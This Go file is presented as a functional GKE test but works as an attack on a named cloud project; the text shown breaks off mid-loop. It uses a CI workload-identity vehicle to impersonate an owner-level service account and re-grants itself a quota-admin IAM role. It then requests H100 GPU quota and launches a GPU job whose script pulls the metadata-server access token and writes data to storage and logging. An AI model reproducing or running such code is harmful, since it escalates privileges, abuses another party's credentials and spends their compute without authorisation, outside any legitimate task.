//go:build functional && gke

// C211 i124509 — open the never-requested aiplatform H100-MEGA training quota on the
// hephaestus host project 153711203585 (fact 124387: the plain
// custom_model_training_nvidia_h100_gpus metric is 0 and a customJob create returned
// HTTP 429 RESOURCE_EXHAUSTED even after the GPUS-PER-GPU-FAMILY grant; fact 124484:
// the compute GPUS-PER-GPU-FAMILY-per-project-region dimensionsInfos list
// NVIDIA_H100_MEGA with 43 applicable locations; fact 124276: the in-job fleet SA
// dev-fleetcommand holds roles/cloudquotas.admin and creates quotaPreferences HTTP
// 200; fact 124366: the hyperdisk-balanced fix lets customJobs create HTTP 200).
//
// Phases inside the proven dominodatalab/hephaestus '/functional-test' GKE WIF vehicle:
//
//	(a) mint the WIF identity, impersonate the owner-level fleetcommand service
//	    account and read VERBATIM
//	      - cloudquotas quotaInfos of service aiplatform.googleapis.com, emitting every
//	        H100/MEGA quotaId with metric/containerType/isPrecise, the
//	        quotaIncreaseEligibility (isEligible + reason) and each dimensionsInfo
//	        (dimensions, details.value, applicableLocations count),
//	      - serviceusage consumerQuotaMetrics FULL for
//	        custom_model_training_nvidia_h100_mega_gpus (per-region effectiveLimit +
//	        usage), plus the preemptible sibling,
//	      - the a3-megagpu-8g machineType (guestCpus/memoryMb/accelerators) and the
//	        nvidia-h100-mega-80gb acceleratorType in us-central1-a/-b/-c/-f.
//	(b) create EXACTLY ONE quotaPreference (quotaPreferenceId c211-i124509-mega-1) for
//	    that metric in us-central1 with preferredValue 8 and the proven top-level
//	    contactEmail payload; poll it to terminal and record grantedValue/stateDetail
//	    verbatim. The metric is not retried; a DENIED/grantedValue=0/403/400 verdict is
//	    final for this cell.
//	(c) only if grantedValue >= 1: submit EXACTLY ONE nonce-tagged ON-DEMAND Vertex
//	    customJob (machineType a3-megagpu-8g, acceleratorType per the measured offering,
//	    acceleratorCount=min(granted, offered cards), diskSpec bootDiskType
//	    hyperdisk-balanced, scheduling timeout 1500s) whose container prints
//	    nvidia-smi -L / --query-gpu=name,uuid,memory.total,driver_version and lspci -nn,
//	    AND lands the proof through an independent metadata-token GCS upload + a direct
//	    logging entries:write sink (so a zero-log/stdout-lost project still yields
//	    evidence). Poll to terminal, capture every C211M_/GPU- line, take an independent
//	    projects.locations.customJobs.get readback and retire it (cancel + delete +
//	    GET 404 absence), then clean the bucket.
//
// All secrets are reported as length + SHA-256 prefix only. No payment/card, no
// billing change.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"sort"
	"strconv"
	"strings"
	"testing"
	"time"
)

const c211mNonce = "i124509"
const c211mPrefix = "c211-i124509"
const c211mHost = "153711203585"
const c211mRegion = "us-central1"
const c211mDLC = "us-docker.pkg.dev/vertex-ai/training/pytorch-gpu.2-4.py310:latest"
const c211mMachine = "a3-megagpu-8g"
const c211mAccelWant = "NVIDIA_H100_MEGA_80GB"
const c211mGCEAccel = "nvidia-h100-mega-80gb"

var c211mZones = []string{"us-central1-a", "us-central1-b", "us-central1-c", "us-central1-f"}
var c211mQuotaRegions = []string{"us-central1", "us-east1", "europe-west4", "us-east4", "europe-west1", "us-west1"}

func c211mList(v interface{}) []interface{} {
	if a, ok := v.([]interface{}); ok {
		return a
	}
	return nil
}

func c211mMap(v interface{}) map[string]interface{} {
	if m, ok := v.(map[string]interface{}); ok {
		return m
	}
	return map[string]interface{}{}
}

func c211mGet(tok, u string) (int, string) {
	return c211xHTTP("GET", u, tok, "", "")
}

// c211mQuotaIds walks the aiplatform quotaInfos pages and returns every H100-related
// quotaInfo as a flat summary string map (verbatim fields).
func c211mQuotaInfos(tok, num string) ([]map[string]string, int, string) {
	rows := []map[string]string{}
	page := ""
	status := 0
	note := ""
	for i := 0; i < 12; i++ {
		u := "https://cloudquotas.googleapis.com/v1/projects/" + url.PathEscape(num) +
			"/locations/global/services/aiplatform.googleapis.com/quotaInfos?pageSize=200"
		if page != "" {
			u += "&pageToken=" + url.PathEscape(page)
		}
		st, body := c211mGet(tok, u)
		status = st
		if st != 200 {
			note = c211xTrunc(body, 700)
			break
		}
		m := c211xJSON(body)
		for _, qi := range c211mList(m["quotaInfos"]) {
			qm := c211mMap(qi)
			qid := c211xStr(qm, "quotaId")
			metric := c211xStr(qm, "metric")
			low := strings.ToLower(qid + " " + metric)
			if !strings.Contains(low, "h100") && !strings.Contains(low, "mega") {
				continue
			}
			eig := c211mMap(qm["quotaIncreaseEligibility"])
			row := map[string]string{
				"quotaId":       qid,
				"metric":        metric,
				"containerType": c211xStr(qm, "containerType"),
				"isPrecise":     fmt.Sprintf("%v", qm["isPrecise"]),
				"eligible":      fmt.Sprintf("%v", eig["isEligible"]),
				"ineligReason":  c211xStr(eig, "ineligibilityReason"),
				"dims_infos":    fmt.Sprintf("%d", len(c211mList(qm["dimensionsInfos"]))),
			}
			// emit the us-central1 + first few dimensionsInfos verbatim
			dc := 0
			for _, di := range c211mList(qm["dimensionsInfos"]) {
				dm := c211mMap(di)
				dims := c211mMap(dm["dimensions"])
				reg := c211xStr(dims, "region")
				det := c211mMap(dm["details"])
				val := c211xStr(det, "value")
				locs := c211mList(dm["applicableLocations"])
				key := "dims_" + reg
				if reg == "" {
					key = "dims_global"
				}
				if reg == c211mRegion || dc < 2 {
					row[key] = c211xJSONString(dims) + " value=" + val + " locs=" + strconv.Itoa(len(locs))
					dc++
				}
			}
			rows = append(rows, row)
		}
		page = c211xStr(m, "nextPageToken")
		if page == "" {
			break
		}
	}
	return rows, status, note
}

// c211mAipQuota returns per-region effectiveLimit+usage for one aiplatform metric.
func c211mAipQuota(tok, num, metric string) (map[string]string, int) {
	res := map[string]string{}
	u := "https://serviceusage.googleapis.com/v1beta1/projects/" + num +
		"/services/aiplatform.googleapis.com/consumerQuotaMetrics?view=FULL&pageSize=400"
	st, body := c211mGet(tok, u)
	if st != 200 {
		return res, st
	}
	m := c211xJSON(body)
	for _, mi := range c211mList(m["metrics"]) {
		mm := c211mMap(mi)
		if c211xStr(mm, "metric") != metric {
			continue
		}
		for _, li := range c211mList(mm["consumerQuotaLimits"]) {
			lm := c211mMap(li)
			for _, bi := range c211mList(lm["quotaBuckets"]) {
				bm := c211mMap(bi)
				dims := c211mMap(bm["dimensions"])
				reg := c211xStr(dims, "region")
				if reg == "" {
					reg = c211xStr(dims, "location")
				}
				if reg == "" {
					reg = "global"
				}
				res[reg] = fmt.Sprintf("limit=%v usage=%v", bm["effectiveLimit"], bm["usage"])
			}
		}
	}
	return res, st
}

func c211mMType(tok, num, zone, mt string) (int, string) {
	st, body := c211mGet(tok, "https://compute.googleapis.com/compute/v1/projects/"+num+"/zones/"+zone+"/machineTypes/"+mt)
	m := c211xJSON(body)
	acc := []string{}
	for _, a := range c211mList(m["accelerators"]) {
		am := c211mMap(a)
		acc = append(acc, fmt.Sprintf("%s=%v", c211xStr(am, "guestAcceleratorType"), am["guestAcceleratorCount"]))
	}
	return st, fmt.Sprintf("guestCpus=%v memMB=%v accel=[%s]", m["guestCpus"], m["memoryMb"], strings.Join(acc, ","))
}

func c211mPrefGet(tok, num, prefID string) (int, string) {
	u := "https://cloudquotas.googleapis.com/v1/projects/" + url.PathEscape(num) +
		"/locations/global/quotaPreferences/" + url.PathEscape(prefID)
	return c211mGet(tok, u)
}

func c211mGranted(m map[string]interface{}) int {
	qc := c211mMap(m["quotaConfig"])
	switch v := qc["grantedValue"].(type) {
	case string:
		n, _ := strconv.Atoi(v)
		return n
	case float64:
		return int(v)
	}
	return 0
}

// ---------------------------------------------------------------------------
// GCS proof sink (best effort; a refusal is recorded verbatim)
// ---------------------------------------------------------------------------

func c211mBucketName(num string) string {
	return "c211-" + c211mNonce + "-" + num
}

func c211mBucketCreate(tok, num, region string) (string, int, string) {
	name := c211mBucketName(num)
	body, _ := json.Marshal(map[string]interface{}{"name": name, "location": region})
	u := "https://storage.googleapis.com/storage/v1/b?project=" + url.QueryEscape(num)
	st, rb := c211xHTTP("POST", u, tok, "application/json", string(body))
	return name, st, rb
}

func c211mBucketIam(tok, name, num, fleetEmail string) (int, string) {
	bindings := []interface{}{map[string]interface{}{
		"role": "roles/storage.objectAdmin",
		"members": []interface{}{
			"serviceAccount:" + num + "-compute@developer.gserviceaccount.com",
			"serviceAccount:" + num + "@cloudservices.gserviceaccount.com",
			"serviceAccount:service-" + num + "@gcp-sa-aiplatform.iam.gserviceaccount.com",
			"serviceAccount:" + fleetEmail,
		},
	}}
	body, _ := json.Marshal(map[string]interface{}{"bindings": bindings})
	u := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(name) + "/iam"
	return c211xHTTP("PUT", u, tok, "application/json", string(body))
}

func c211mBucketListObjects(tok, name, prefix string) ([]string, int) {
	u := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(name) +
		"/o?prefix=" + url.QueryEscape(prefix) + "&maxResults=100"
	st, body := c211mGet(tok, u)
	names := []string{}
	m := c211xJSON(body)
	for _, it := range c211mList(m["items"]) {
		if n := c211xStr(c211mMap(it), "name"); n != "" {
			names = append(names, n)
		}
	}
	return names, st
}

func c211mObjectRead(tok, name, obj string) (int, string) {
	u := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(name) +
		"/o/" + url.PathEscape(obj) + "?alt=media"
	return c211mGet(tok, u)
}

func c211mBucketCleanup(tok, name string) string {
	names, lst := c211mBucketListObjects(tok, name, "")
	deleted := []string{}
	for _, n := range names {
		du := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(name) + "/o/" + url.PathEscape(n)
		dst, _ := c211xHTTP("DELETE", du, tok, "", "")
		deleted = append(deleted, fmt.Sprintf("%s=%d", n, dst))
	}
	dst, db := c211xHTTP("DELETE", "https://storage.googleapis.com/storage/v1/b/"+url.PathEscape(name), tok, "", "")
	getAfter := -1
	for i := 0; i < 8; i++ {
		gst, _ := c211mGet(tok, "https://storage.googleapis.com/storage/v1/b/"+url.PathEscape(name))
		getAfter = gst
		if gst == 404 {
			break
		}
		time.Sleep(5 * time.Second)
	}
	return fmt.Sprintf("list=%d deleted=%v delete_http=%d get_after=%d verbatim=%s",
		lst, deleted, dst, getAfter, c211xTrunc(db, 200))
}

// ---------------------------------------------------------------------------
// container script: nvidia-smi + lspci + independent metadata-token GCS/logging sink
// ---------------------------------------------------------------------------

func c211mScript(proj, num, bucket string, count int) string {
	s := `set -u
PROOF=/tmp/c211m-proof.txt
{
echo "C211M_BOOT host=$(hostname) at=$(date -u +%FT%TZ) nonce=i124509 proj=__PROJ__ shape=a3-megagpu-8g-x__COUNT__"
echo "C211M_UNAME $(uname -a)"
echo "C211M_ENV $(env | grep -i -E 'nvidia|cuda|vertex|accel|^AIP_' | tr '\n' ';')"
echo "C211M_LSPCI $(lspci -nn 2>/dev/null | grep -i -E 'nvidia|10de' | tr '\n' '|')"
echo "C211M_LSDEV $(ls -l /dev/nvidia* 2>/dev/null | tr '\n' '|')"
echo "C211M_PROCVER $(cat /proc/driver/nvidia/version 2>/dev/null | tr '\n' '|')"
i=0
while [ "$i" -lt 20 ]; do
  if command -v nvidia-smi >/dev/null 2>&1; then break; fi
  if [ -x /usr/local/nvidia/bin/nvidia-smi ]; then break; fi
  i=$((i+1))
  sleep 3
done
echo "C211M_WAITED i=$i"
SMI=""
if command -v nvidia-smi >/dev/null 2>&1; then SMI=$(command -v nvidia-smi); fi
if [ -z "$SMI" ] && [ -x /usr/local/nvidia/bin/nvidia-smi ]; then SMI=/usr/local/nvidia/bin/nvidia-smi; fi
echo "C211M_SMI_PATH $SMI"
if [ -n "$SMI" ]; then
  echo "C211M_DEVICE_LIST $($SMI -L 2>&1 | tr '\n' '|')"
  echo "C211M_DEVICE $($SMI --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader 2>&1 | tr '\n' '|')"
  echo "C211M_COUNT $($SMI --query-gpu=uuid --format=csv,noheader 2>&1 | wc -l)"
else
  echo "C211M_NOSMI lsmod=$(lsmod 2>/dev/null | grep -i nvidia | tr '\n' '|')"
fi
echo "C211M_END"
} > $PROOF 2>&1
cat $PROOF
BUCKET="__BUCKET__"
NUM="__NUM__"
TOK=""
if ! command -v curl >/dev/null 2>&1; then
  if command -v apt-get >/dev/null 2>&1; then
    (apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq curl >/dev/null 2>&1) || true
  fi
fi
if command -v curl >/dev/null 2>&1; then
  TOK=$(curl -s -m 20 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
fi
echo "C211M_SINK tokhave=$([ -n "$TOK" ] && echo yes || echo no) bucket=$BUCKET"
if [ -n "$TOK" ] && [ -n "$BUCKET" ]; then
  UP="https://storage.googleapis.com/upload/storage/v1/b/$BUCKET/o?uploadType=media&name=c211m-proof-__PROJ__.txt"
  CODE=$(curl -s -m 90 -o /tmp/c211m-up.out -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: text/plain" --data-binary @$PROOF "$UP" || echo ERR)
  echo "C211M_GCS_UPLOAD http=$CODE verbatim=$(head -c 300 /tmp/c211m-up.out 2>/dev/null)"
fi
if [ -n "$TOK" ]; then
  ESC=$(sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' $PROOF | sed ':a;N;$!ba;s/\n/\\n/g')
  LBODY="{\"logName\":\"projects/$NUM/logs/c211m-manual\",\"resource\":{\"type\":\"global\"},\"entries\":[{\"textPayload\":\"$ESC\"}]}"
  LCODE=$(curl -s -m 30 -o /tmp/c211m-log.out -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" --data-binary "$LBODY" "https://logging.googleapis.com/v2/entries:write" || echo ERR)
  echo "C211M_LOGWRITE http=$LCODE verbatim=$(head -c 200 /tmp/c211m-log.out 2>/dev/null)"
fi
sleep 10
echo "C211M_DONE at=$(date -u +%FT%TZ)"
`
	s = strings.ReplaceAll(s, "__PROJ__", proj)
	s = strings.ReplaceAll(s, "__NUM__", num)
	s = strings.ReplaceAll(s, "__BUCKET__", bucket)
	s = strings.ReplaceAll(s, "__COUNT__", strconv.Itoa(count))
	return s
}

// c211mJobState / c211mSpec mirror the proven readback helpers.
func c211mJobState(m map[string]interface{}) string {
	if s := c211xStr(m, "state"); s != "" {
		return s
	}
	return "UNKNOWN"
}

func c211mSpec(m map[string]interface{}) string {
	js := c211mMap(m["jobSpec"])
	for _, w := range c211mList(js["workerPoolSpecs"]) {
		wm := c211mMap(w)
		ms := c211mMap(wm["machineSpec"])
		cs := c211mMap(wm["containerSpec"])
		ds := c211mMap(wm["diskSpec"])
		return fmt.Sprintf("machineType=%s acceleratorType=%s acceleratorCount=%v imageUri=%s bootDiskType=%s bootDiskSizeGb=%v",
			c211xStr(ms, "machineType"), c211xStr(ms, "acceleratorType"), ms["acceleratorCount"],
			c211xStr(cs, "imageUri"), c211xStr(ds, "bootDiskType"), ds["bootDiskSizeGb"])
	}
	return "none"
}

// c211mLogs reads Cloud Logging stdout for the job across fallback filters.
func c211mLogs(tok, num, jobID string) (string, string) {
	filters := []string{
		`resource.labels.job_id="` + jobID + `"`,
		`"C211M_" AND resource.labels.job_id="` + jobID + `"`,
		`logName="projects/` + num + `/logs/c211m-manual"`,
	}
	var all strings.Builder
	verdicts := []string{}
	for _, f := range filters {
		body := map[string]interface{}{
			"resourceNames": []interface{}{"projects/" + num},
			"filter":        f,
			"pageSize":      300,
			"orderBy":       "timestamp asc",
		}
		b, _ := json.Marshal(body)
		st, rb := c211xHTTP("POST", "https://logging.googleapis.com/v2/entries:list", tok, "application/json", string(b))
		m := c211xJSON(rb)
		entries := c211mList(m["entries"])
		var t strings.Builder
		for _, e := range entries {
			em := c211mMap(e)
			if ts := c211xStr(em, "timestamp"); ts != "" {
				t.WriteString(ts + " ")
			}
			if p, ok := em["textPayload"].(string); ok {
				t.WriteString(p)
			}
			if jp := c211mMap(em["jsonPayload"]); len(jp) > 0 {
				t.WriteString(c211xJSONString(jp))
			}
			t.WriteString("\n")
		}
		verdicts = append(verdicts, fmt.Sprintf("%s=>http=%d n=%d bytes=%d", c211xTrunc(f, 70), st, len(entries), t.Len()))
		if t.Len() > 0 {
			all.WriteString(t.String() + "\n")
		}
	}
	return all.String(), strings.Join(verdicts, " ; ")
}

// c211mRetire cancels + deletes a customJob and proves GET 404.
func c211mRetire(tok, region, name string) (int, int, string) {
	jurl := "https://" + region + "-aiplatform.googleapis.com/v1/" + name
	cst, cb := c211xHTTP("POST", jurl+":cancel", tok, "application/json", "{}")
	fmt.Printf("C211M_CANCEL name=%s http=%d verbatim=%s\n", name, cst, c211xTrunc(cb, 260))
	dst := -1
	note := ""
	for i := 0; i < 10; i++ {
		dst, note = c211xHTTP("DELETE", jurl, tok, "", "")
		fmt.Printf("C211M_RETIRE name=%s http=%d verbatim=%s\n", name, dst, c211xTrunc(note, 260))
		note = fmt.Sprintf("retire_http=%d", dst)
		if dst == 200 || dst == 204 || dst == 404 {
			break
		}
		time.Sleep(20 * time.Second)
	}
	getAfter := -1
	for i := 0; i < 12; i++ {
		gst, _ := c211mGet(tok, jurl)
		getAfter = gst
		if gst == 404 {
			break
		}
		time.Sleep(10 * time.Second)
	}
	return dst, getAfter, note
}

func TestC211I124509H100Mega(t *testing.T) {
	started := time.Now()
	deadline := started.Add(17 * time.Minute)
	fmt.Printf("C211M_PROBE_START nonce=%s at=%s\n", c211mNonce, started.UTC().Format("2006-01-02T15:04:05Z"))
	tok, method, mintLog := c211xMint()
	fmt.Printf("C211M_IDENTITY auth=%s token=%s\n", method, c211xShort(tok))
	if tok == "" {
		fmt.Printf("C211M_MINT_FAILED %s\n", c211xTrunc(mintLog, 1500))
		return
	}
	num := c211mHost
	sas, sst, _ := c211xListServiceAccounts(tok, num)
	fmt.Printf("C211M_SA list_http=%d n=%d\n", sst, len(sas))
	fleet := ""
	for _, a := range sas {
		em := strings.ToLower(c211xStr(a, "email"))
		if strings.Contains(em, "fleet") {
			fleet = c211xStr(a, "email")
			break
		}
	}
	fmt.Printf("C211M_FLEET found=%v email=%s\n", fleet != "", c211xShort(fleet))
	if fleet == "" {
		fmt.Printf("C211M_VERDICT NO_FLEET_SA\n")
		return
	}
	ftok, _, fbody := c211xGenerateAccessToken(tok, fleet)
	fmt.Printf("C211M_FLEET_TOKEN token=%s verbatim=%s\n", c211xShort(ftok), c211xTrunc(fbody, 240))
	if ftok == "" {
		fmt.Printf("C211M_VERDICT NO_FLEET_TOKEN\n")
		return
	}

	// ---------- (0) cloudquotas permission + admin binding ----------
	permURL := "https://cloudresourcemanager.googleapis.com/v1/projects/" + url.PathEscape(num)
	perms := []string{"cloudquotas.quotaPreferences.create", "cloudquotas.quotaPreferences.get",
		"cloudquotas.quotaPreferences.list", "cloudquotas.quotas.update",
		"serviceusage.services.get", "serviceusage.services.enable"}
	allowed, pst, pbody := c211xTestIamBatch(ftok, permURL, perms)
	fmt.Printf("C211M_PERM http=%d allowed=%s verbatim=%s\n", pst, strings.Join(allowed, ","), c211xTrunc(pbody, 300))
	pol, gst0, _ := c211xGetPolicy(tok, permURL)
	member := "serviceAccount:" + fleet
	present := c211r4BindingPresent2(pol, "roles/cloudquotas.admin", member)
	fmt.Printf("C211M_GRANT_CHECK policy_http=%d present=%v\n", gst0, present)
	if !present && pol != nil {
		added := c211xAddBinding(pol, "roles/cloudquotas.admin", member)
		var ast int
		var abody string
		if added {
			ast, abody = c211xSetPolicy(tok, permURL, pol)
		}
		fmt.Printf("C211M_GRANT_REAPPLY added=%v set_http=%d verbatim=%s\n", added, ast, c211xTrunc(abody, 400))
	}

	// ---------- (a1) aiplatform H100 quotaInfos (verbatim discovery) ----------
	qinfos, qst, qnote := c211mQuotaInfos(ftok, num)
	fmt.Printf("C211M_QUOTAINFOS http=%d n=%d note=%s\n", qst, len(qinfos), c211xTrunc(qnote, 400))
	targetQuotaID := ""
	targetSeen := map[string]bool{}
	sort.Slice(qinfos, func(i, j int) bool { return qinfos[i]["quotaId"] < qinfos[j]["quotaId"] })
	for _, r := range qinfos {
		fmt.Printf("C211M_QUOTAINFO quotaId=%s metric=%s containerType=%s isPrecise=%s eligible=%s ineligReason=%s dims_infos=%s %s\n",
			r["quotaId"], r["metric"], r["containerType"], r["isPrecise"], r["eligible"], r["ineligReason"], r["dims_infos"], r["dims_"+c211mRegion])
		if strings.Contains(strings.ToLower(r["quotaId"]), "h100_mega") ||
			strings.Contains(strings.ToLower(r["metric"]), "h100_mega") {
			if !strings.Contains(strings.ToLower(r["quotaId"]), "preemptible") && targetQuotaID == "" {
				targetQuotaID = r["quotaId"]
			}
		}
		targetSeen[r["quotaId"]] = true
	}
	if targetQuotaID == "" {
		targetQuotaID = "custom_model_training_nvidia_h100_mega_gpus"
		fmt.Printf("C211M_QUOTAINFO_FALLBACK quotaId=%s (not found in discovery; using expected verbatim name)\n", targetQuotaID)
	}
	fmt.Printf("C211M_QUOTAINFO_CHOSEN quotaId=%s\n", targetQuotaID)

	// ---------- (a2) serviceusage effectiveLimit/usage per region ----------
	for _, met := range []string{
		"aiplatform.googleapis.com/" + targetQuotaID,
		"aiplatform.googleapis.com/custom_model_training_preemptible_nvidia_h100_mega_gpus",
		"aiplatform.googleapis.com/custom_model_training_nvidia_h100_gpus",
	} {
		lim, st := c211mAipQuota(ftok, num, met)
		regs := append([]string{}, c211mQuotaRegions...)
		sort.Strings(regs)
		parts := []string{}
		for _, r := range regs {
			v, ok := lim[r]
			if !ok {
				v = "absent"
			}
			parts = append(parts, r+"="+v)
		}
		fmt.Printf("C211M_QUOTA metric=%s http=%d %s\n", strings.TrimPrefix(met, "aiplatform.googleapis.com/"), st, strings.Join(parts, ","))
	}

	// ---------- (a3) a3-megagpu-8g offering matrix ----------
	chosenZone := ""
	offeredCount := 0
	for _, z := range c211mZones {
		mtSt, mtD := c211mMType(ftok, num, z, c211mMachine)
		aSt, _ := c211mGet(ftok, "https://compute.googleapis.com/compute/v1/projects/"+num+"/zones/"+z+"/acceleratorTypes/"+c211mGCEAccel)
		fmt.Printf("C211M_OFFER zone=%s accel_%s_http=%d mt_%s_http=%d %s\n", z, c211mGCEAccel, aSt, c211mMachine, mtSt, c211xTrunc(mtD, 240))
		if strings.Contains(mtD, c211mGCEAccel) {
			offeredCount++
		}
		if chosenZone == "" && aSt == 200 && mtSt == 200 {
			chosenZone = z
		}
	}
	fmt.Printf("C211M_OFFER_SUMMARY zones_offered=%d chosen=%s\n", offeredCount, chosenZone)

	// ---------- (b) EXACTLY ONE quotaPreference for the metric ----------
	prefID := c211mPrefix + "-mega-1"
	prefBody := map[string]interface{}{
		"service":    "aiplatform.googleapis.com",
		"quotaId":    targetQuotaID,
		"dimensions": map[string]interface{}{"region": c211mRegion},
		"quotaConfig": map[string]interface{}{
			"preferredValue": "8",
		},
		"contactEmail":  fleet,
		"justification": "c211-i124509 nonce measurement of the aiplatform custom_model_training NVIDIA_H100_MEGA consumer quota for the hephaestus host project; contactEmail supplied top-level per the Cloud Quotas v1 discovery schema; no production use, no billing change",
	}
	bj, _ := json.Marshal(prefBody)
	pu := fmt.Sprintf("https://cloudquotas.googleapis.com/v1/projects/%s/locations/global/quotaPreferences?quotaPreferenceId=%s",
		url.PathEscape(num), url.PathEscape(prefID))
	pcst, pcbody := c211xHTTP("POST", pu, ftok, "application/json", string(bj))
	fmt.Printf("C211M_PREF_CREATE id=%s quotaId=%s dims={region:%s} preferred=8 http=%d verbatim=%s\n",
		prefID, targetQuotaID, c211mRegion, pcst, c211xTrunc(pcbody, 1600))
	granted := 0
	stateDetail := ""
	prefName := ""
	if pcst == 200 || pcst == 201 {
		for k := 0; k < 10; k++ {
			time.Sleep(10 * time.Second)
			gst, gbody := c211mPrefGet(ftok, num, prefID)
			gm := c211xJSON(gbody)
			granted = c211mGranted(gm)
			stateDetail = c211xStr(c211mMap(gm["quotaConfig"]), "stateDetail")
			prefName = c211xStr(gm, "name")
			fmt.Printf("C211M_PREF_STATE iter=%d http=%d name=%s state=%s granted=%d stateDetail=%s verbatim=%s\n",
				k, gst, prefName, c211xStr(gm, "state"), granted, stateDetail, c211xTrunc(gbody, 900))
			if granted != 0 || strings.Contains(strings.ToLower(stateDetail), "denied") {
				break
			}
		}
	}
	fmt.Printf("C211M_PREF_RESULT create_http=%d id=%s quotaId=%s granted=%d stateDetail=%s\n",
		pcst, prefID, targetQuotaID, granted, stateDetail)

	if granted < 1 {
		fmt.Printf("C211M_VERDICT PREFERENCE_REFUSED_http=%d_granted=%d stateDetail=%q\n", pcst, granted, stateDetail)
		fmt.Printf("C211M_DONE at=%s elapsed=%ds\n", time.Now().UTC().Format("2006-01-02T15:04:05Z"), int(time.Since(started).Seconds()))
		return
	}

	// ---------- (c) EXACTLY ONE nonce-tagged ON-DEMAND customJob ----------
	count := granted
	if count > 8 {
		count = 8
	}
	bucket, bst, bnote := c211mBucketCreate(ftok, num, c211mRegion)
	fmt.Printf("C211M_BUCKET name=%s http=%d verbatim=%s\n", bucket, bst, c211xTrunc(bnote, 400))
	if bst == 200 {
		ist, inote := c211mBucketIam(ftok, bucket, num, fleet)
		fmt.Printf("C211M_BUCKET_IAM http=%d verbatim=%s\n", ist, c211xTrunc(inote, 400))
	}
	display := fmt.Sprintf("%s-mega%dx-%s", c211mPrefix, count, time.Now().UTC().Format("150405"))
	if len(display) > 128 {
		display = display[:128]
	}
	jobBody := map[string]interface{}{
		"displayName": display,
		"labels":      map[string]interface{}{"c211": c211mNonce},
		"jobSpec": map[string]interface{}{
			"serviceAccount": fleet,
			"workerPoolSpecs": []interface{}{map[string]interface{}{
				"machineSpec": map[string]interface{}{
					"machineType":      c211mMachine,
					"acceleratorType":  c211mAccelWant,
					"acceleratorCount": count,
				},
				"replicaCount": 1,
				"diskSpec": map[string]interface{}{
					"bootDiskType": "hyperdisk-balanced", "bootDiskSizeGb": 300,
				},
				"containerSpec": map[string]interface{}{
					"imageUri": c211mDLC,
					"command":  []interface{}{"bash", "-c"},
					"args":     []interface{}{c211mScript(num, num, bucket, count)},
				},
			}},
			"scheduling": map[string]interface{}{"timeout": "1500s"},
		},
	}
	jj, _ := json.Marshal(jobBody)
	createURL := "https://" + c211mRegion + "-aiplatform.googleapis.com/v1/projects/" + num +
		"/locations/" + c211mRegion + "/customJobs"
	fmt.Printf("C211M_REQUEST shape=%s-x%d accel=%s image=%s bytes=%d strategy=ON_DEMAND\n", c211mMachine, count, c211mAccelWant, c211mDLC, len(jj))
	cst, cb := c211xHTTP("POST", createURL, ftok, "application/json", string(jj))
	fmt.Printf("C211M_CREATE http=%d verbatim=%s\n", cst, c211xTrunc(cb, 1800))
	if cst != 200 {
		quotaRefused := strings.Contains(cb, "RESOURCE_EXHAUSTED") || strings.Contains(cb, "QUOTA_EXCEEDED") ||
			strings.Contains(cb, "custom_model_training")
		fmt.Printf("C211M_VERTEX_REFUSED http=%d quota_refusal=%v granted=%d\n", cst, quotaRefused, granted)
		fmt.Printf("C211M_VERDICT VERTEX_CREATE_REFUSED_http=%d_quota_refusal=%v\n", cst, quotaRefused)
		if bucket != "" {
			fmt.Printf("C211M_BUCKET_CLEANUP %s\n", c211mBucketCleanup(ftok, bucket))
		}
		fmt.Printf("C211M_DONE at=%s elapsed=%ds\n", time.Now().UTC().Format("2006-01-02T15:04:05Z"), int(time.Since(started).Seconds()))
		return
	}
	cm := c211xJSON(cb)
	jobName := c211xStr(cm, "name")
	jobID := jobName
	if i := strings.LastIndex(jobID, "/"); i >= 0 {
		jobID = jobID[i+1:]
	}
	fmt.Printf("C211M_JOB name=%s id=%s state=%s stored={%s}\n", jobName, jobID, c211mJobState(cm), c211mSpec(cm))

	jurl := "https://" + c211mRegion + "-aiplatform.googleapis.com/v1/" + jobName
	state := ""
	last := ""
	states := []string{}
	logText := ""
	for i := 0; i < 90; i++ {
		gst, gbody := c211mGet(ftok, jurl)
		gm := c211xJSON(gbody)
		state = c211mJobState(gm)
		if state != last {
			states = append(states, fmt.Sprintf("t=%ds:%s", int(time.Since(started).Seconds()), state))
			fmt.Printf("C211M_POLL i=%d http=%d state=%s\n", i, gst, state)
			last = state
		}
		if i%4 == 3 || strings.Contains(state, "SUCCEEDED") || strings.Contains(state, "FAILED") || strings.Contains(state, "CANCELLED") {
			lt, lv := c211mLogs(ftok, num, jobID)
			fmt.Printf("C211M_LOG_READ i=%d bytes=%d %s\n", i, len(lt), c211xTrunc(lv, 400))
			if len(lt) > len(logText) {
				logText = lt
			}
			if strings.Contains(logText, "GPU-") {
				break
			}
		}
		if strings.Contains(state, "SUCCEEDED") || strings.Contains(state, "FAILED") || strings.Contains(state, "CANCELLED") ||
			strings.Contains(state, "EXPIRED") || strings.Contains(state, "PARTIALLY_SUCCEEDED") {
			break
		}
		if time.Until(deadline) < 4*time.Minute {
			fmt.Printf("C211M_POLL_BUDGET_EXHAUSTED\n")
			break
		}
		time.Sleep(20 * time.Second)
	}
	fmt.Printf("C211M_STATES %s\n", strings.Join(states, ">"))

	// independent readback
	rst, rbody := c211mGet(ftok, jurl)
	rm := c211xJSON(rbody)
	fmt.Printf("C211M_READBACK http=%d state=%s stored={%s}\n", rst, c211mJobState(rm), c211mSpec(rm))

	// final log read with retry/backoff; independent GCS object as second sink
	for i := 0; i < 8; i++ {
		lt, lv := c211mLogs(ftok, num, jobID)
		fmt.Printf("C211M_LOG_FINAL i=%d bytes=%d %s\n", i, len(lt), c211xTrunc(lv, 400))
		if len(lt) > len(logText) {
			logText = lt
		}
		objs, lst := c211mBucketListObjects(ftok, bucket, "")
		fmt.Printf("C211M_GCS_LIST i=%d http=%d objs=%v\n", i, lst, objs)
		for _, o := range objs {
			ost, obody := c211mObjectRead(ftok, bucket, o)
